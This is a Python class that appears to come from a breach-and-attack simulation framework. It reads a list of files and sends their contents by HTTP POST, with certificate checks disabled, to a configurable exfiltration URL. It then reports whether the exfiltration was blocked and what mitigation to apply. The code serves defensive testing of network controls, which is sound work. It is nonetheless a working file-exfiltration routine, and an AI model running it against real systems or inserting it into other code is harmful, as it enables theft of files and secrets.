import logging
import requests
import os
import binascii
from ai_utils.phases.abstract_phase import AbstractPhaseClass
from ai_utils.scenarios.globals import NetworkUtils, FileUtils


class ExfiltrateFilesOverHttpPhaseClass(AbstractPhaseClass):
    TrackerId = "219"
    Subject = "Ex-Filtrate Files Over Http"
    Description = "Ex-Filtrate Files Over Http"

    def __init__(self, is_phase_critical, exfiltration_url, list_of_files_to_exfiltrate):
        """
          This Phase checks reads a file and sends it to the given exfiltration host through HTTP protocol.

          :param is_phase_critical (bool): Dictates if the phase is critical.
          :param exfiltration_url(str): Url to the host and resource where the files will be sent.
          :param list_of_files_to_exfiltrate(str): List of filenames to read, and then exfiltrate its content.

          :return: True if the remote server responds with a 200 OK for at least one of the files to exfiltrate, False otherwise
          """
        logging.debug('Executing ExfiltrateFilesOverHttpPhaseClass constructor. is_phase_critical: {}, exfiltration_url: {}, list_of_files_to_exfiltrate: {}'.format(is_phase_critical, exfiltration_url, list_of_files_to_exfiltrate))
        AbstractPhaseClass.__init__(self, is_phase_critical)
        self.exfiltration_url = NetworkUtils.CheckUrlPrefix(exfiltration_url)
        self.list_of_files_to_exfiltrate = list_of_files_to_exfiltrate
        self.list_of_exfiltrated_files = []

    def Setup(self):
        if not self.exfiltration_url:
            self.PhaseReporter.Error('Exfiltration URL parameter is required')
            return False
        if not self.list_of_files_to_exfiltrate:
            self.PhaseReporter.Error('List of Files to Exfiltrate parameter is required')
            return False
        return True

    def Run(self):
        logging.debug('Executing Run')
        success = self.exfiltrate_files()
        self.log_success(success)
        return success

    def exfiltrate_files(self):
        logging.debug('Executing exfiltrate_files')
        for file_to_exfiltrate in self.list_of_files_to_exfiltrate:
            if self.exfiltrate_file(file_to_exfiltrate):
                self.list_of_exfiltrated_files.append(file_to_exfiltrate)
                self.PhaseReporter.Info('Successfully exfiltrated file "{}" to "{}"'.format(os.path.basename(file_to_exfiltrate), self.exfiltration_url))
            else:
                self.PhaseReporter.Info('Failed to exfiltrate file "{}" to "{}"'.format(os.path.basename(file_to_exfiltrate), self.exfiltration_url))
        return len(self.list_of_exfiltrated_files) > 0

    def exfiltrate_file(self, file_to_exfiltrate):
        logging.debug('Executing exfiltrate_file. file_to_exfiltrate: {}'.format(file_to_exfiltrate))
        success = False
        try:
            success = self.read_and_exfiltrate_file(file_to_exfiltrate)
        except Exception as e:
            self.PhaseReporter.Error('An exception occured when trying to exfiltrate file "{}" to remote host "{}"'.format(os.path.basename(file_to_exfiltrate), self.exfiltration_url))
            logging.exception(e)
        return success

    def read_and_exfiltrate_file(self, file_to_exfiltrate):
        logging.debug('Executing read_and_exfiltrate_file. file_to_exfiltrate: {}'.format(file_to_exfiltrate))
        success = False
        payload = FileUtils.ReadFromFile(file_to_exfiltrate)
        if payload:
            success = self.exfiltrate_payload(payload)
        elif payload == '':
            self.PhaseReporter.Warn('File "{}" is empty, data can not be exfiltrated'.format(file_to_exfiltrate))
        else:
            self.PhaseReporter.Error('File "{}" to be exfiltrated could not be read'.format(file_to_exfiltrate))
        return success

    def exfiltrate_payload(self, payload):
        logging.debug('Executing exfiltrate_payload. payload: {}(...)'.format(binascii.hexlify(payload)[:10]))
        response = requests.post(self.exfiltration_url, payload, timeout=30, verify=False, allow_redirects=False)
        if response and response.status_code == 200:
            return True
        return False

    def log_success(self, success):
        logging.debug('Executing log_success. success: {}'.format(success))
        if success:
            self.PhaseResult['list_of_files_exfiltrated'] = self.list_of_exfiltrated_files
            self.PhaseResult['exfiltration_url'] = self.exfiltration_url
            self.PhaseReporter.Info('Successfully exfiltrated files over HTTP')
            self.PhaseReporter.Report('Data exfiltration through HTTP requests was not blocked. Exfiltration URL: {}, Exfiltrated Files: {}'.format(self.exfiltration_url, ', '.join([os.path.basename(exfil_file) for exfil_file in self.list_of_exfiltrated_files])))
            self.PhaseReporter.Mitigation('Forbid or inspect data in HTTP traffic to remote host: {}, and for the following files: {}'.format(self.exfiltration_url, ', '.join([os.path.basename(exfil_file) for exfil_file in self.list_of_exfiltrated_files])))
        else:
            self.PhaseReporter.Info('Failed to exfiltrate files over HTTP')
